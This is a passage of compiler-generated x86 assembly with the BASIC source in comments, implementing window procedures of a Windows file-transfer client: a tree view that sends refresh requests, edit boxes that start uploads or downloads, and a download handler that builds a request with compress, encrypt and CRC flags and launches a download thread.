	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2136] IF RIGHT$(filename,1) != "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.00D9.client			;;; i219
;
; [2137] hItem = getTreeParent(hItem)
	push	[ebp-64]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [2138] filename = getTreeCompLabel(hItem)
	push	[ebp-64]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2139] END IF
else.00D9.client:
end.if.00D9.client:
;
; [2140] SendSMessage(idx,"refresh "+STRING$(hItem)+" "+filename)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04E9.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-116]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2141] END SELECT
case.00D4.000B.client:
end.select.00D4.client:
;
; [2143] CASE ELSE		: RETURN CallWindowProcA (#tree_proc, hWnd, msg, wParam, lParam)
	jmp	end.select.00D0.client			;;; i69
case.00D0.0003.client:
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#tree_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func14.client			;;; i258
;
; [2144] END SELECT
end.select.00D0.client:
;
; [2146] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.tab6Proc.client:  ;;; Function end label for Assembly Programmers.
end.func14.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func14.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
free.func14.client:
	mov	esi,[ebp-108]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  tab6Proc ()  *****
;  *****
;
; [2148] FUNCTION  edit6Proc (hWnd, msg, wParam, lParam)
.code
;
#ifdef edit6Proc.hWnd
#undef edit6Proc.hWnd
#endif
#define edit6Proc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef edit6Proc.msg
#undef edit6Proc.msg
#endif
#define edit6Proc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef edit6Proc.wParam
#undef edit6Proc.wParam
#endif
#define edit6Proc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef edit6Proc.lParam
#undef edit6Proc.lParam
#endif
#define edit6Proc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_edit6Proc.client@16:
;  *****
;  *****  FUNCTION  edit6Proc ()  *****
;  *****
func13.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody13.client:
;
; [2149] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select13.00DA = ebp-40	; internal variable
	mov	d[ebp-40],eax			;;; i670
;
; [2150] CASE $$WM_KEYDOWN :
	mov	eax,256			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00DA.0001.client			;;; i71
;
; [2151] IF (wParam == $$VK_RETURN) THEN
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,13			;;; i684a
	jne	>> else.00DB.client			;;; i219
;
; [2152] SendMessageA (#upload_tab, $$WM_COMMAND, $$UPL_go, hWnd)
	push	[ebp+8]			;;; i674a
	push	511			;;; i656a
	push	273			;;; i656a
	push	[%#upload_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2153] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func13.client			;;; i258
;
; [2154] END IF
else.00DB.client:
end.if.00DB.client:
;
; [2155] END SELECT
case.00DA.0001.client:
end.select.00DA.client:
;
; [2157] RETURN CallWindowProcA (#edit6_proc, hWnd, msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#edit6_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func13.client			;;; i258
;
; [2158] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.edit6Proc.client:  ;;; Function end label for Assembly Programmers.
end.func13.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  edit6Proc ()  *****
;  *****
;
; [2160] FUNCTION  edit3Proc (hWnd, msg, wParam, lParam)
.code
;
#ifdef edit3Proc.hWnd
#undef edit3Proc.hWnd
#endif
#define edit3Proc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef edit3Proc.msg
#undef edit3Proc.msg
#endif
#define edit3Proc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef edit3Proc.wParam
#undef edit3Proc.wParam
#endif
#define edit3Proc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef edit3Proc.lParam
#undef edit3Proc.lParam
#endif
#define edit3Proc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_edit3Proc.client@16:
;  *****
;  *****  FUNCTION  edit3Proc ()  *****
;  *****
func12.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody12.client:
;
; [2161] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select12.00DC = ebp-40	; internal variable
	mov	d[ebp-40],eax			;;; i670
;
; [2162] CASE $$WM_KEYDOWN :
	mov	eax,256			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00DC.0001.client			;;; i71
;
; [2163] IF (wParam == $$VK_RETURN) THEN
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,13			;;; i684a
	jne	>> else.00DD.client			;;; i219
;
; [2164] SendMessageA (#download_tab, $$WM_COMMAND, $$DNL_go, hWnd)
	push	[ebp+8]			;;; i674a
	push	501			;;; i656a
	push	273			;;; i656a
	push	[%#download_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2165] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func12.client			;;; i258
;
; [2166] END IF
else.00DD.client:
end.if.00DD.client:
;
; [2167] END SELECT
case.00DC.0001.client:
end.select.00DC.client:
;
; [2169] RETURN CallWindowProcA (#edit3_proc, hWnd, msg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	[%#edit3_proc.client]			;;; i672a
	call	_CallWindowProcA@20			;;; i619
	jmp	end.func12.client			;;; i258
;
; [2170] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.edit3Proc.client:  ;;; Function end label for Assembly Programmers.
end.func12.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  edit3Proc ()  *****
;  *****
;
; [2172] FUNCTION  downProc (hWnd, msg, wParam, lParam)
.code
;
#ifdef downProc.hWnd
#undef downProc.hWnd
#endif
#define downProc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef downProc.msg
#undef downProc.msg
#endif
#define downProc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef downProc.wParam
#undef downProc.wParam
#endif
#define downProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef downProc.lParam
#undef downProc.lParam
#endif
#define downProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_downProc.client@16:
;  *****
;  *****  FUNCTION  downProc ()  *****
;  *****
func10.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func10.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.399:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.399			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,100			;;; i114a
;
funcBody10.client:
;
; [2173] STATIC STRING text
data section 'globals$statics'
align	4
%10%text.client:	db 4 dup ?
.code
;
; [2174] STRING path,saveas
#ifdef downProc.path
#undef downProc.path
#endif
#define downProc.path ebp-40	; exposes local variable 'path'
;
#ifdef downProc.saveas
#undef downProc.saveas
#endif
#define downProc.saveas ebp-44	; exposes local variable 'saveas'
;
;
; [2175] STRING filename,filter
#ifdef downProc.filename
#undef downProc.filename
#endif
#define downProc.filename ebp-48	; exposes local variable 'filename'
;
#ifdef downProc.filter
#undef downProc.filter
#endif
#define downProc.filter ebp-52	; exposes local variable 'filter'
;
;
; [2177] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select10.00DE = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [2178] CASE $$WM_COMMAND	:
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00DE.0001.client			;;; i71
;
; [2179] SELECT CASE wParam
	mov	eax,d[ebp+16]			;;; i665
; .select10.00DF = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
;
; [2180] CASE $$DNL_browse
	mov	eax,504			;;; i659
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00DF.0001.client			;;; i71
;
; [2181] filename = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2182] filter = "All Files (*.*)\0*.*\0\0"
	mov	eax,addr @_string.04FF.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2183] ShowSaveFileDialog (#winMain, @filename,filter , initDir$, "Save As")
	mov	eax,d[ebp-52]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk10.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
#ifdef downProc.initDir$
#undef downProc.initDir$
#endif
#define downProc.initDir$ ebp-72	; exposes local variable 'initDir$'
;
	mov	eax,d[ebp-72]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk10.0001 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	mov	eax,addr @_string.0502.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[%#winMain.client]			;;; i672a
	call	func21.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-48],ecx			;;; i670
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+16]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
;
; [2184] IF filename THEN SendMessageA (#edit9, $$WM_SETTEXT, 0, &filename)
	mov	eax,[ebp-48]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00E0.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00E0.client			;;; i218
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit9.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
else.00E0.client:
end.if.00E0.client:
;
; [2186] CASE $$DNL_go	:
	jmp	end.select.00DF.client			;;; i69
case.00DF.0001.client:
	mov	eax,501			;;; i659
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00DF.0002.client			;;; i71
;
; [2187] text = NULL$(512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,addr %10%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2188] SendMessageA (#edit4, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%10%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit4.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2189] port = XLONG(CSIZE$(text))
#ifdef downProc.port
#undef downProc.port
#endif
#define downProc.port ebp-84	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,[%10%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-84],eax			;;; i670
;
; [2190] SendMessageA (#edit3, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%10%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit3.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2191] path = CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%10%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2192] SendMessageA (#edit9, $$WM_GETTEXT, 512, &text)
	mov	eax,d[%10%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	push	13			;;; i656a
	push	[%#edit9.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2193] saveas = CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%10%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2194] compress = SendMessageA(#check1, $$BM_GETCHECK, 0, 0)
#ifdef downProc.compress
#undef downProc.compress
#endif
#define downProc.compress ebp-88	; exposes local variable 'compress'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check1.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-88],eax			;;; i670
;
; [2195] encrypt = SendMessageA(#check2, $$BM_GETCHECK, 0, 0)
#ifdef downProc.encrypt
#undef downProc.encrypt
#endif
#define downProc.encrypt ebp-92	; exposes local variable 'encrypt'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check2.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-92],eax			;;; i670
;
; [2196] crc = SendMessageA(#check3, $$BM_GETCHECK, 0, 0)
#ifdef downProc.crc
#undef downProc.crc
#endif
#define downProc.crc ebp-96	; exposes local variable 'crc'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	240			;;; i656a
	push	[%#check3.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-96],eax			;;; i670
;
; [2197] 'PRINT port,path,compress,encrypt,crc,saveas,#server$
;
; [2199] IFZ path THEN RETURN 0
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.395			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E1.client			;;; i192
A.395:
	mov	eax,0			;;; i659
	jmp	end.func10.client			;;; i258
else.00E1.client:
end.if.00E1.client:
;
; [2200] IFZ saveas THEN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.396			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E2.client			;;; i192
A.396:
;
; [2201] DecomposePathname (path, pathname$, parent$, @saveas, file$, extent$)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
#ifdef downProc.pathname$
#undef downProc.pathname$
#endif
#define downProc.pathname$ ebp-100	; exposes local variable 'pathname$'
;
	mov	eax,d[ebp-100]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-80],eax			;;; i670
#ifdef downProc.parent$
#undef downProc.parent$
#endif
#define downProc.parent$ ebp-104	; exposes local variable 'parent$'
;
	mov	eax,d[ebp-104]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk10.0002 = ebp-112	; internal variable
	mov	d[ebp-112],eax			;;; i670
#ifdef downProc.file$
#undef downProc.file$
#endif
#define downProc.file$ ebp-116	; exposes local variable 'file$'
;
	mov	eax,d[ebp-116]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk10.0003 = ebp-124	; internal variable
	mov	d[ebp-124],eax			;;; i670
#ifdef downProc.extent$
#undef downProc.extent$
#endif
#define downProc.extent$ ebp-128	; exposes local variable 'extent$'
;
	mov	eax,d[ebp-128]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-124]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-112]			;;; i674a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	call	func26.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+12]			;;; i877a
	mov	[ebp-44],ecx			;;; i670
	mov	esi,d[esp+16]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+20]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
;
; [2202] IF saveas THEN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00E3.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00E3.client			;;; i218
;
; [2203] text = NULL$(512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,addr %10%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2204] GetCurrentDirectoryA (512,&text)
;
; [0] EXTERNAL FUNCTION GetCurrentDirectoryA (nBufferLength, lpBuffer)
	mov	eax,d[%10%text.client]			;;; i642
	push	eax			;;; i667a
	push	512			;;; i656a
	call	_GetCurrentDirectoryA@8			;;; i619
;
; [2205] text = CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%10%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,addr %10%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2206] IF RIGHT$(text,1) != "\\" THEN text = text + "\\"
	sub	esp,64			;;; i487
	mov	eax,[%10%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.00E4.client			;;; i219
	mov	eax,[%10%text.client]			;;; i663a
	mov	ebx,addr @_string.0149.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %10%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.00E4.client:
end.if.00E4.client:
;
; [2207] saveas = text + saveas
	mov	eax,[%10%text.client]			;;; i663a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2208] SendMessageA (#edit9, $$WM_SETTEXT, 0, &saveas)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#edit9.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [2209] ELSE
	jmp	end.if.00E3.client			;;; i107
else.00E3.client:
;
; [2210] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func10.client			;;; i258
;
; [2211] END IF
end.if.00E3.client:
;
; [2212] END IF
else.00E2.client:
end.if.00E2.client:
;
; [2214] IFZ port THEN port = $$FILE_DEFAULTPORT
	mov	eax,d[ebp-84]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00E5.client			;;; i195
	mov	eax,28010			;;; i659
	mov	d[ebp-84],eax			;;; i670
else.00E5.client:
end.if.00E5.client:
;
; [2215] flag = 0x0000
#ifdef downProc.flag
#undef downProc.flag
#endif
#define downProc.flag ebp-132	; exposes local variable 'flag'
;
	mov	eax,0			;;; i659
	mov	d[ebp-132],eax			;;; i670
;
; [2216] IF compress THEN flag = flag | $$FILE_COMPRESS
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00E6.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,4			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00E6.client:
end.if.00E6.client:
;
; [2217] IF encrypt THEN flag = flag | $$FILE_ENCRYPT
	mov	eax,d[ebp-92]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00E7.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,2			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00E7.client:
end.if.00E7.client:
;
; [2218] IF crc THEN flag = flag | $$FILE_CRC
	mov	eax,d[ebp-96]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00E8.client			;;; i221
	mov	eax,d[ebp-132]			;;; i665
	or	eax,1			;;; i763
	mov	d[ebp-132],eax			;;; i670
else.00E8.client:
end.if.00E8.client:
;
; [2219] text = $$FILE_DEFAULTAUTH+","+ #server$+","+STRING$(port)+","+path+","+saveas+",0,0,"+STRING$(flag)
	mov	eax,addr @_string.0198.client			;;; i663
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%#server$.client]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-84]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0519.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-132]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %10%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2220] IFT #CONNECTED THEN
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00E9.client			;;; i221
;
; [2221] _beginthreadex (NULL, 0, &ClientDownload(), &text, 0, &tid)
#ifdef downProc.NULL
#undef downProc.NULL
#endif
#define downProc.NULL ebp-136	; exposes local variable 'NULL'
;
	mov	eax,addr _ClientDownload.client@4			;;; i599
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[%10%text.client]			;;; i642
	mov	d[ebp-80],eax			;;; i670
#ifdef downProc.tid
#undef downProc.tid
#endif
#define downProc.tid ebp-140	; exposes local variable 'tid'
;
	lea	eax,[ebp-140]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-80]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	0			;;; i656a
	push	[ebp-136]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [2222] Sleep (20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2223] END IF
else.00E9.client:
end.if.00E9.client:
;
; [2224] END SELECT
case.00DF.0002.client:
